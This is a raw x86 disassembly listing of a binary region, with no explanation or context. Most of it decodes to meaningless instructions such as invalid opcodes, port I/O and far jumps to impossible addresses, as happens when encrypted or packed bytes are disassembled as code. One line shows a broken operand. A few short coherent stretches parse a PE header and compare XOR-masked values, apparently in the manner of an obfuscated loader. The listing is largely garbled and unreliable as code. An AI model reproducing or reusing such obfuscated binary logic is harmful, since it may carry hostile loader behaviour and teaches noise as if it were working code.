  408cb6:	shr    DWORD PTR [ecx+edi*1],0x2e
  408cba:	dec    esp
  408cbb:	or     DWORD PTR [ebx-0x14b9ca68],esp
  408cc1:	mul    DWORD PTR [ebp+0xda18ffa]
  408cc7:	dec    edx
  408cc8:	aam    0xde
  408cca:	les    esp,FWORD PTR [ecx]
  408ccc:	jmp    0xf5f25736
  408cd1:	loope  0x408c66
  408cd3:	jecxz  0x408cee
  408cd5:	js     0x408d09
  408cd7:	out    dx,eax
  408cd8:	lods   al,BYTE PTR ds:[esi]
  408cd9:	xchg   edx,eax
  408cda:	rol    ebp,0xbe
  408cdd:	sahf   
  408cde:	xchg   edx,eax
  408cdf:	adc    al,0x90
  408ce1:	cmp    DWORD PTR ds:0x2beec097,0xa51ae245
  408ceb:	cmp    DWORD PTR [ecx-0x664c66e2],ebp
  408cf1:	mov    ch,0xa5
  408cf3:	and    ch,0xbd
  408cf6:	sub    BYTE PTR [eax+0x72e0f207],bh
  408cfc:	scas   eax,DWORD PTR es:[edi]
  408cfd:	sub    cl,BYTE PTR [edx]
  408cff:	sbb    al,0x7b
  408d01:	call   0x9802d27e
  408d06:	sbb    ah,ch
  408d08:	iret   
  408d09:	and    ebx,DWORD PTR [eax-0x27e4fbe7]
  408d0f:	or     ecx,eax
  408d11:	add    al,0x65
  408d13:	in     al,dx
  408d14:	bound  esp,QWORD PTR [edx-0x42]
  408d17:	add    ebp,edi
  408d19:	and    BYTE PTR [edi-0x1f],ch
  408d1c:	repz or ch,BYTE PTR [ebp+eax*2-0x485bebf4]
  408d24:	inc    ebx
  408d25:	add    ah,BYTE PTR [ecx+ebp*1]
  408d28:	jl     0x408cc7
  408d2a:	in     eax,dx
  408d2b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d2d:	push   0x19df4fa9
  408d32:	sub    cl,BYTE PTR [esi]
  408d34:	adc    DWORD PTR [esi+0x46],esi
  408d37:	push   esp
  408d38:	adc    esi,ecx
  408d3a:	xor    BYTE PTR fs:[esi+0x33],dh
  408d3e:	(bad)  
  408d3f:	add    ecx,DWORD PTR [ebx-0x3d]
  408d42:	jg     0x408cd6
  408d44:	xchg   ebp,eax
  408d45:	mov    eax,ds:0x94b0389a
  408d4a:	jecxz  0x408d5f
  408d4c:	sub    eax,0x7830eb4d
  408d51:	pusha  
  408d52:	inc    edx
  408d53:	push   esi
  408d54:	mov    esp,0xed31924a
  408d59:	sub    cl,0x23
  408d5c:	mov    ah,0x48
  408d5e:	mov    ebx,?
  408d60:	fdivr  QWORD PTR [edx-0x2e55bc0c]
  408d66:	ins    BYTE PTR es:[edi],dx
  408d67:	inc    edx
  408d68:	add    al,0x55
  408d6a:	jnp    0x408d89
  408d6c:	shl    ch,0x11
  408d6f:	push   esi
  408d70:	bound  edx,QWORD PTR [ebx+0x455fdde3]
  408d76:	dec    eax
  408d77:	fs call 0xb0b3:0x1ba2be1a
  408d7f:	xchg   esp,eax
  408d80:	cwde   
  408d81:	fs cs stos BYTE PTR es:[edi],al
  408d84:	cmp    BYTE PTR [ebx-0x1a],cl
  408d87:	dec    ecx
  408d88:	cld    
  408d89:	cld    
  408d8a:	add    esi,0x99e31ed0
  408d90:	mov    edi,0x393af250
  408d95:	daa    
  408d96:	pusha  
  408d97:	scas   al,BYTE PTR es:[edi]
  408d98:	sti    
  408d99:	xchg   esi,eax
  408d9a:	sub    bl,bl
  408d9c:	dec    eax
  408d9d:	mov    al,BYTE PTR [ecx-0x10]
  408da0:	out    dx,eax
  408da1:	or     edx,edi
  408da3:	cmc    
  408da4:	dec    eax
  408da5:	mov    esp,0x2f9f8b61
  408daa:	push   esp
  408dab:	cmp    eax,0xbe17917f
  408db0:	and    eax,0xf2c62cf3
  408db5:	xor    edx,edi
  408db7:	and    DWORD PTR [eax],0x8b10e110
  408dbd:	cwde   
  408dbe:	and    al,0xf0
  408dc0:	aaa    
  408dc1:	add    eax,0x56502c8d
  408dc6:	fwait
  408dc7:	and    DWORD PTR [esi],edi
  408dc9:	fmul   QWORD PTR [edx]
  408dcb:	mov    bh,0xba
  408dcd:	repnz xchg ebp,eax
  408dcf:	popa   
  408dd0:	dec    cl
  408dd2:	push   ebp
  408dd3:	scas   al,BYTE PTR es:[edi]
  408dd4:	inc    ebp
  408dd5:	add    DWORD PTR [edx-0x2a],edx
  408dd8:	xchg   ecx,eax
  408dd9:	arpl   WORD PTR [ecx+ebx*1],sp
  408ddc:	fwait
  408ddd:	aaa    
  408dde:	sbb    eax,0x6912d2b7
  408de3:	sub    edx,DWORD PTR [edx-0x7e2c26e0]
  408de9:	dec    ebp
  408dea:	and    al,0xab
  408dec:	adc    bl,BYTE PTR [ecx]
  408dee:	pop    ds
  408def:	scas   al,BYTE PTR es:[edi]
  408df0:	or     al,0x89
  408df2:	in     eax,dx
  408df3:	or     bh,BYTE PTR [esi+0x2ec108f6]
  408df9:	xor    esp,DWORD PTR [eax]
  408dfb:	cmp    dl,BYTE PTR [eax]
  408dfd:	(bad)  
  408dfe:	je     0x408e41
  408e00:	cld    
  408e01:	cdq    
  408e02:	out    0xb2,al
  408e04:	mov    ecx,0xc4188bbc
  408e09:	out    0x44,eax
  408e0b:	adc    DWORD PTR ds:0x811dca07,esi
  408e11:	inc    ebp
  408e12:	sbb    DWORD PTR [eax],esp
  408e14:	js     0x408e47
  408e16:	add    eax,0x8462c5ef
  408e1b:	iret   
  408e1c:	jae    0x408e51
  408e1e:	cs inc edi
  408e20:	adc    DWORD PTR [esi-0x6b109fc3],ebx
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x1aace7bd
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	mov    dh,0x53
  408ec6:	push   ds
  408ec7:	xlat   BYTE PTR ds:[ebx]
  408ec8:	dec    ebx
  408ec9:	fwait
  408eca:	inc    eax
  408ecb:	push   ds
  408ecc:	nop
  408ecd:	call   0x666fd0cb
  408ed2:	jp     0x408e91
  408ed4:	jl     0x408e86
  408ed6:	mov    bl,0xa4
  408ed8:	shl    BYTE PTR [ebp+0x6b],1
  408edb:	xor    eax,0x2ac9523e
  408ee0:	std    
  408ee1:	(bad)  
  408ee2:	push   edx
  408ee3:	add    DWORD PTR [edx+0x1f423da8],ebx
  408ee9:	jl     0x408f49
  408eeb:	sbb    esp,0x64
  408eee:	or     al,dh
  408ef0:	sub    DWORD PTR [ecx-0x12],ebp
  408ef3:	dec    ecx
  408ef4:	arpl   WORD PTR ds:0x65356900,ax
  408efa:	enter  0xd6f6,0x9b
  408efe:	mov    cl,0xb0
  408f00:	xchg   DWORD PTR [edi-0x65],edi
  408f03:	scas   eax,DWORD PTR es:[edi]
  408f04:	and    al,bl
  408f06:	call   0x84ac4f57
  408f0b:	jo     0x408f20
  408f0d:	mov    dl,0x26
  408f0f:	mov    cl,0x6
  408f11:	adc    eax,0x82263e91
  408f16:	fwait
  408f17:	sub    cl,BYTE PTR [esi+ebp*8+0x6e87e04d]
  408f1e:	test   eax,0x988fcd3
  408f23:	repnz push ebx
  408f25:	icebp  
  408f26:	out    dx,eax
  408f27:	and    al,0x5d
  408f29:	mov    ds:0xa067356a,al
  408f2e:	sbb    BYTE PTR [eax],bh
  408f30:	inc    ebp
  408f31:	sub    al,0x6
  408f33:	mov    ss,WORD PTR [eax+0x70]
  408f36:	adc    eax,0x4dddbd7
  408f3b:	(bad)  
  408f3c:	hlt    
  408f3d:	push   edx
  408f3e:	jns    0x408f9a
  408f40:	outs   dx,DWORD PTR ds:[esi]
  408f41:	mov    edi,DWORD PTR [ecx-0x35801a87]
  408f47:	adc    bl,BYTE PTR [edi+0xa258a65]
  408f4d:	or     al,0xf2
  408f4f:	arpl   WORD PTR [edi+0x2f],cx
  408f52:	sub    esp,esp
  408f54:	push   es
  408f55:	dec    esi
  408f56:	sbb    al,0x92
  408f58:	jmp    0x51c:0x112f0ec9
  408f5f:	loopne 0x408f04
  408f61:	imul   esp,DWORD PTR [ecx-0x2899fbb5],0xdd38e46f
  408f6b:	cmp    BYTE PTR [ebp-0x1ea43da5],al
  408f71:	push   ss
  408f72:	cdq    
  408f73:	jecxz  0x408fcd
  408f75:	and    esi,DWORD PTR [ebx+0x52]
  408f78:	fadd   DWORD PTR [esi-0x6b]
  408f7b:	fwait
  408f7c:	hlt    
  408f7d:	jg     0x408f05
  408f7f:	xchg   esp,eax
  408f80:	fs arpl di,si
  408f83:	ja     0x408f95
  408f85:	stc    
  408f86:	or     eax,0x84f76020
  408f8b:	clc    
  408f8c:	bound  ecx,QWORD PTR [eax+ebx*1]
  408f8f:	add    eax,0x314d324b
  408f94:	and    ah,0x9d
  408f97:	mov    cl,BYTE PTR [ebx+0xad2025f]
  408f9d:	fs pop bp
  408fa0:	imul   edi,DWORD PTR [eax-0x7ace1690],0x33
  408fa7:	and    al,0xa
  408fa9:	int    0xfb
  408fab:	out    dx,eax
  408fac:	aaa    
  408fad:	sbb    esp,ecx
  408faf:	addr16 out dx,al
  408fb1:	push   0x4f49b9c5
  408fb6:	mov    fs,WORD PTR [edi+0x52bbf25a]
  408fbc:	sub    eax,0xc699d32d
  408fc1:	sbb    DWORD PTR [eax-0x454be0a8],0x66dfc2aa
  408fcb:	das    
  408fcc:	xchg   ecx,edi
  408fce:	mov    ebp,0x5c690961
  408fd3:	sbb    eax,0xb7eab007
  408fd8:	sub    ebp,DWORD PTR [ecx]
  408fda:	sbb    eax,0x5e9b7b37
  408fdf:	js     0x40905d
  408fe1:	jno    0x409059
  408fe3:	jmp    0x409000
  408fe5:	mov    eax,0x2a1359f0
  408fea:	out    dx,al
  408feb:	popf   
  408fec:	fild   WORD PTR [eax-0xd]
  408fef:	and    al,0xa6
  408ff1:	mov    ecx,0xe460efcc
  408ff6:	xchg   ebx,eax
  408ff7:	ins    BYTE PTR es:[edi],dx
  408ff8:	mov    DWORD PTR [eax+0x29],ebx
  408ffb:	aaa    
  408ffc:	and    eax,eax
  408ffe:	fcom   QWORD PTR [ecx]
  409000:	addr16 mov edi,0xba54a81b
  409006:	sbb    ah,BYTE PTR [ebp-0x6]
  409009:	xchg   esp,eax
  40900a:	xor    eax,DWORD PTR [esi-0x1c6b8001]
  409010:	loop   0x408fe4
  409012:	sub    esi,DWORD PTR [ecx+edx*2]
  409015:	aas    
  409016:	imul   ecx,eax,0x2b
  409019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40901a:	pop    ebx
  40901b:	jg     0x408f9d
  40901d:	jns    0x408fbb
  40901f:	sbb    BYTE PTR [ebx],dl
  409021:	ret    0x202c
  409024:	push   esp
  409025:	loope  0x409055
  409027:	jae    0x409083
  409029:	retf   0xfbf
  40902c:	mov    ebx,0x8a2607f4
  409031:	push   ebx
  409032:	test   DWORD PTR [ecx],edx
  409034:	xchg   edi,eax
  409035:	es ds (bad) 
  409038:	std    
  409039:	push   ds
  40903a:	pop    edx
  40903b:	add    eax,0x93da1e1d
  409040:	lea    edi,[edi]
  409042:	pop    ss
  409043:	dec    esp
  409044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409045:	call   0x5b32860a
  40904a:	mov    eax,0x4246c17b
  40904f:	jge    0x40906f
  409051:	repnz in al,0xfc
  409054:	jp     0x409016
  409056:	sahf   
  409057:	push   ebp
  409058:	(bad)  
  409059:	aas    
  40905a:	xor    DWORD PTR [eax+eiz*2],esi
  40905d:	cld    
  40905e:	lds    esi,FWORD PTR [edi]
  409060:	add    DWORD PTR [eax+0x38d6f759],ebp
  409066:	push   ds
  409067:	adc    esi,ecx
  409069:	sbb    eax,0x5f23104e
  40906e:	jne    0x4090ca
  409070:	dec    ecx
  409071:	lahf   
  409072:	fsub   DWORD PTR [esp+ebx*8]
  409075:	and    esi,DWORD PTR [edx+eiz*2]
  409078:	fbld   TBYTE PTR [edx-0x1d9b404b]
  40907e:	xchg   ecx,eax
  40907f:	mul    DWORD PTR [ebx-0x3e62fa69]
  409085:	xchg   edx,eax
  409086:	nop
  409087:	pop    ds
  409088:	(bad)  
  409089:	sub    al,0x97
  40908b:	mul    DWORD PTR ds:0x65a5f2c2
  409091:	mov    BYTE PTR [ebx+0x5b],bh
  409094:	hlt    
  409095:	(bad)  
  409096:	push   esp
  409097:	retf   
  409098:	inc    esp
  409099:	ror    BYTE PTR [ebx+0x199f055c],0xb0
  4090a0:	pop    edi
  4090a1:	shr    BYTE PTR [ebx+0x7],0x6b
  4090a5:	sub    DWORD PTR [eax+0x44],0xff21ef4a
  4090ac:	add    al,0xdd
  4090ae:	sbb    al,0x11
  4090b0:	jmp    DWORD PTR [ebp+0x25cb3bbd]
  4090b6:	adc    ebp,eax
  4090b8:	in     al,dx
  4090b9:	cmp    edi,DWORD PTR [edi+0x43]
  4090bc:	add    eax,0x5de7c135
  4090c1:	test   ebx,0xa80e65fa
  4090c7:	mov    dl,0xe2
  4090c9:	pop    esi
  4090ca:	lahf   
  4090cb:	pop    ds
  4090cc:	stc    
  4090cd:	xor    al,0x37
  4090cf:	mov    esi,0x7d5447bf
  4090d4:	mov    eax,0xc828b0f9
  4090d9:	and    al,0xd8
  4090db:	sub    al,0x72
  4090dd:	retf   0x583e
  4090e0:	jle    0x40910b
  4090e2:	setb   cl
  4090e5:	mov    edx,0x2ea80069
  4090ea:	mov    eax,ds:0x332de458
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x3d
  409163:	sbb    DWORD PTR [esi+ebx*8+0x32],ebx
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	bound  ebx,QWORD PTR [edx]
  409170:	mov    ecx,DWORD PTR [ebx-0x71]
  409173:	in     al,0xa8
  409175:	call   0x3c33:0xbb561c76
  40917c:	sub    al,BYTE PTR [esi]
  40917e:	sar    ebx,cl
  409180:	xor    al,0xcc
  409182:	jb     0x40918e
  409184:	into   
  409185:	psrlq  mm6,QWORD PTR [edx-0x3f2b7ed2]
  40918c:	cmp    al,0x58
  40918e:	sub    al,0xc1
  409190:	add    BYTE PTR [ebx],al
  409192:	mov    al,0x49
  409194:	dec    eax
  409195:	xlat   BYTE PTR ds:[ebx]
  409196:	ret    0xafda
  409199:	adc    ecx,DWORD PTR [ecx-0x58]
  40919c:	push   0x5f1425b
  4091a1:	aaa    
  4091a2:	push   0xffffffb9
  4091a4:	popf   
  4091a5:	mov    bl,0x20
  4091a7:	fmul   DWORD PTR [edi]
  4091a9:	lods   eax,DWORD PTR ds:[esi]
  4091aa:	ret    0x5cfa
  4091ad:	cwde   
  4091ae:	fwait
  4091af:	outs   dx,DWORD PTR ds:[esi]
  4091b0:	jmp    0x5845:0x5380ac12
  4091b7:	int3   
  4091b8:	std    
  4091b9:	jmp    0x516e1ea8
  4091be:	popa   
  4091bf:	pop    ds
  4091c0:	jae    0x409180
  4091c2:	icebp  
  4091c3:	setno  BYTE PTR [ecx]
  4091c6:	(bad)  
  4091c8:	test   DWORD PTR [edi],esp
  4091ca:	pop    es
  4091cb:	out    0x92,eax
  4091cd:	repz out dx,eax
  4091cf:	jno    0x409166
  4091d1:	xchg   edi,eax
  4091d2:	add    eax,0x21dc2517
  4091d7:	loopne 0x409240
  4091d9:	and    edx,0xffffffc2
  4091dc:	xchg   edx,eax
  4091dd:	add    al,0xa4
  4091df:	in     al,dx
  4091e0:	pop    eax
  4091e1:	repnz dec ebx
  4091e3:	pop    eax
  4091e4:	sub    BYTE PTR [edi-0x65251881],ah
  4091ea:	nop
  4091eb:	int    0x9
  4091ed:	mov    ds:0xab68e214,eax
  4091f2:	daa    
  4091f3:	jbe    0x409254
  4091f5:	or     BYTE PTR [edx+0x303b1f00],ah
  4091fb:	leave  
  4091fc:	push   ebp
  4091fd:	ret    0x545e
  409200:	inc    edx
  409201:	shr    esp,cl
  409203:	cld    
  409204:	je     0x4091fc
  409206:	call   0xe174e9c4
  40920b:	pop    edi
  40920c:	adc    DWORD PTR [edx+ebp*2-0x22],0xffffffb2
  409211:	mov    esp,0x2686766
  409216:	leave  
  409217:	into   
  409218:	adc    eax,0x1872f3cf
  40921d:	push   esi
  40921e:	xor    DWORD PTR [esi-0x24],eax
  409221:	push   0xcd4b6586
  409226:	repnz aas 
  409228:	scas   eax,DWORD PTR es:[edi]
  409229:	cli    
  40922a:	loope  0x4091d8
  40922c:	aaa    
  40922d:	adc    dh,BYTE PTR [ebx+0x7]
  409230:	test   al,0x5b
  409232:	cmp    BYTE PTR [esi+0x14],bl
  409235:	scas   al,BYTE PTR es:[edi]
  409236:	loopne 0x40926a
  409238:	and    BYTE PTR [ebx-0x215c61d8],cl
  40923e:	add    DWORD PTR [ebx+0xaa63ae0],esp
  409244:	dec    ebx
  409245:	xchg   esp,eax
  409246:	mov    esi,DWORD PTR [ecx+0x487023c0]
  40924c:	mov    dx,0x2fc7
  409250:	or     edi,DWORD PTR [eax+0x1083e2bc]
  409256:	push   0x7c3f03a6
  40925b:	push   0xefc13778
  409260:	test   dh,0xf2
  409263:	xchg   edi,eax
  409264:	fdiv   QWORD PTR [ebx+0x9ef916]
  40926a:	and    eax,0x8968ce23
  40926f:	mov    ds:0x95e1fe8f,al
  409274:	pop    es
  409275:	xchg   eax,edx
  409277:	pop    ds
  409278:	adc    eax,0xddea704a
  40927d:	jg     0x40922c
  40927f:	mov    ebp,0xc3ac43d7
  409284:	and    al,0x87
  409286:	ror    DWORD PTR [ebp+0x45],1
  409289:	imul   ebx,DWORD PTR [edi+0x10],0xffffffcc
  40928d:	fdiv   QWORD PTR [ecx]
  40928f:	add    bh,dh
  409291:	into   
  409292:	ret    
  409293:	sbb    eax,0xd0e0a38b
  409298:	dec    edi
  40929a:	and    al,0xa4
  40929c:	rol    BYTE PTR [ebx+0x63],1
  40929f:	ins    BYTE PTR es:[edi],dx
  4092a0:	imul   ecx,DWORD PTR [ebx+0xd379eec],0xba1663ca
  4092aa:	sub    esp,DWORD PTR ds:0x5cdcddb1
  4092b0:	add    ah,BYTE PTR [esi+0x5817d694]
  4092b6:	(bad)  
  4092b7:	jnp    0x409242
  4092b9:	mov    al,BYTE PTR [eax-0x415b52a2]
  4092bf:	sahf   
  4092c0:	sbb    ebp,DWORD PTR [eax+0x2c]
  4092c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c4:	fs and eax,0xed0c5913
  4092ca:	pushf  
  4092cb:	ror    BYTE PTR [ebx-0x1efaf232],0xa3
  4092d2:	std    
  4092d3:	xor    bh,BYTE PTR ds:0x5394adde
  4092d9:	xchg   edi,eax
  4092da:	aas    
  4092db:	dec    ebp
  4092dc:	mov    DWORD PTR [eax],ebp
  4092de:	add    BYTE PTR [esi+0x2e],0xca
  4092e2:	(bad)  
  4092e4:	popa   
  4092e5:	out    dx,eax
  4092e6:	mov    al,BYTE PTR [edi]
  4092e8:	ins    DWORD PTR es:[edi],dx
  4092e9:	push   edi
  4092ea:	mov    cl,0x7e
  4092ec:	pop    ds
  4092ed:	popf   
  4092ee:	dec    eax
  4092ef:	pop    ebp
  4092f0:	lahf   
  4092f1:	add    ch,cl
  4092f3:	or     ch,BYTE PTR [edi-0x1d]
  4092f6:	cmp    ecx,DWORD PTR [ebx+eiz*1]
  4092f9:	pop    es
  4092fa:	or     DWORD PTR [ecx],ecx
  4092fc:	imul   ebp,DWORD PTR [edx+0x10580ab6],0x60404df2
  409306:	mov    eax,ds:0x303f755f
  40930b:	bound  ebx,QWORD PTR [ebx]
  40930d:	cwde   
  40930e:	sub    ebx,DWORD PTR [ebx-0x73]
  409311:	jp     0x4092f3
  409313:	xor    edx,esi
  409315:	mov    ds:0xce6308f,eax
  40931a:	ret    
  40931b:	mov    ds:0xfe0b4de5,eax
  409320:	jg     0x40934c
  409322:	test   DWORD PTR ds:0x3e8d8c4e,0x82d705ac
  40932c:	daa    
  40932d:	js     0x409372
  40932f:	sbb    DWORD PTR [ebx],0xffffffd6
  409332:	sub    DWORD PTR [edi-0x38d81a47],ebx
  409338:	dec    ebp
  40933a:	test   DWORD PTR [ecx-0x68],edx
  40933d:	mov    edi,0x5510d520
  409342:	call   0xd0b3:0x9fe37d9e
  409349:	push   es
  40934a:	test   eax,0xcd3c1e4d
  40934f:	fsub   st,st(6)
  409351:	cmp    esi,DWORD PTR [ecx]
  409353:	push   0x3319c566
  409358:	mov    al,0xc5
  40935a:	in     eax,dx
  40935b:	sub    al,cl
  40935d:	test   eax,0xcf5a9290
  409362:	sub    al,0xb9
  409364:	push   esp
  409365:	sub    BYTE PTR [edi],0xb2
  409368:	mov    ebx,0x359d7259
  40936d:	ins    BYTE PTR es:[edi],dx
  40936e:	loopne 0x40932a
  409370:	hlt    
  409371:	rcr    DWORD PTR [esi+0x1625bc73],cl
  409377:	das    
  409378:	jne    0x4092ff
  40937a:	out    dx,eax
  40937b:	fist   DWORD PTR [ebx+0x21]
  40937e:	inc    edi
  40937f:	or     DWORD PTR [edx+0x6864e9ab],esi
  409385:	add    al,BYTE PTR [esp+ecx*1+0x0]
  409389:	fcom   QWORD PTR [edi-0x44]
  40938c:	mov    eax,es
  40938e:	and    al,bh
  409390:	out    0xc2,al
  409392:	pop    edi
  409393:	test   BYTE PTR ds:[ebx+0x62],ah
  409397:	add    ecx,DWORD PTR [ecx+0xc458b08]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	sbb    cl,BYTE PTR [eax+0x31]
  4093b7:	mov    ebx,eax
  4093b9:	fnstsw WORD PTR [esi+0x7e]
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	jmp    FWORD PTR [edx-0x7bd01bc6]
  4093c6:	sub    BYTE PTR [edi+0x64],bl
  4093c9:	pop    ecx
  4093ca:	test   al,0x21
  4093cc:	rol    BYTE PTR ds:0xf6253a39,0xda
  4093d3:	fs dec esi
  4093d5:	rol    DWORD PTR [ecx],1
  4093d7:	adc    BYTE PTR [esp+ebx*8-0xd699ff0],bh
  4093de:	not    al
  4093e0:	lds    esp,FWORD PTR [edx+0x17]
  4093e3:	cwde   
  4093e4:	sbb    esi,DWORD PTR [ecx-0x78]
  4093e7:	mov    dh,0xd7
  4093e9:	fsubrp st(2),st
  4093eb:	mov    cl,0xb4
  4093ed:	inc    ebx
  4093ee:	cmp    cl,BYTE PTR [esi+ebp*1+0x4d104825]
  4093f5:	xchg   ecx,eax
  4093f6:	inc    edi
  4093f7:	dec    edi
  4093f8:	or     ebp,esi
  4093fa:	inc    ebp
  4093fb:	mov    bh,0x1c
  4093fd:	pushf  
  4093fe:	sbb    eax,0x43a4083e
  409403:	fnstenv [esi+0x61]
  409406:	or     DWORD PTR [ecx+0x6d],eax
  409409:	ja     0x4093eb
  40940b:	mov    DWORD PTR [edi],esi
  40940d:	retf   0x1e7a
  409410:	adc    ch,BYTE PTR [esi+0x3e]
  409413:	jl     0x4093d5
  409415:	inc    cl
  409417:	mov    edx,0x528f72c1
  40941c:	xchg   DWORD PTR [ebx+0x3d],esi
  40941f:	dec    edx
  409420:	cmp    ecx,eax
  409422:	ret    
  409423:	pop    edx
  409424:	pop    ecx
  409425:	das    
  409426:	and    BYTE PTR [edx],ch
  409428:	out    0x7b,eax
  40942a:	add    al,0x0
  40942c:	es std 
  40942e:	pop    eax
  40942f:	jnp    0x4093d2
  409431:	mov    BYTE PTR [ecx-0x1cfb0796],bh
  409437:	mov    ebp,0xfa292a27
  40943c:	mov    cl,0xf6
  40943e:	loopne 0x4093c5
  409440:	dec    eax
  409441:	aas    
  409442:	and    ch,BYTE PTR [edx+ebp*4+0x30506188]
  409449:	(bad)  
  40944a:	cmp    eax,DWORD PTR ds:0x44147c1a
  409450:	iret   
  409451:	dec    esi
  409452:	cmp    edi,esi
  409454:	(bad)
  409457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409458:	cmp    eax,0x9ede957
  40945d:	jg     0x40941f
  40945f:	sbb    al,0xbc
  409461:	cmp    eax,0x8265b9ea
  409466:	mov    ecx,0xeff05119
  40946b:	push   edx
  40946c:	imul   ebx,DWORD PTR [eax+edx*8-0x1d],0x23
  409471:	lods   al,BYTE PTR ds:[esi]
  409472:	(bad)  
  409473:	and    eax,0x5d2e4a2
  409478:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40947a:	int3   
  40947b:	xchg   ebp,eax
  40947c:	jae    0x4094ea
  40947e:	out    dx,al
  40947f:	outs   dx,DWORD PTR ds:[esi]
  409480:	jnp    0x40948a
  409482:	jecxz  0x409473
  409484:	dec    ebx
  409485:	stc    
  409486:	sub    BYTE PTR [esi+0x40efec39],bh
  40948c:	fimul  WORD PTR [ecx+0x22]
  40948f:	and    edi,DWORD PTR [ebp-0x1b]
  409492:	int3   
  409493:	mov    dh,0x3c
  409495:	dec    edi
  409496:	ds xchg edi,eax
  409498:	test   eax,0x57188fe7
  40949d:	jecxz  0x40951c
  40949f:	mov    ebx,0xe4470781
  4094a4:	push   esp
  4094a5:	jl     0x409437
  4094a7:	push   0x5a5f949f
  4094ac:	push   edi
  4094ad:	ja     0x4094a4
  4094af:	(bad)  
  4094b0:	jl     0x409512
  4094b2:	ss mov eax,0x39d553ec
  4094b8:	inc    edx
  4094b9:	(bad)  
  4094bb:	dec    ebp
  4094bc:	cs xchg esi,eax
  4094be:	adc    DWORD PTR [edx],0x7cbd4bd
  4094c4:	push   edi
  4094c5:	jo     0x40948d
  4094c7:	outs   dx,BYTE PTR ds:[esi]
  4094c8:	xchg   ecx,eax
  4094c9:	dec    ecx
  4094ca:	jge    0x409477
  4094cc:	xchg   esi,eax
  4094cd:	xor    DWORD PTR [edi+0x2bf02fe3],esp
  4094d3:	bound  esi,QWORD PTR [eax]
  4094d5:	adc    eax,0xf0640afb
  4094da:	push   es
  4094db:	mov    ebp,0xd7221838
  4094e0:	xchg   esi,eax
  4094e1:	cdq    
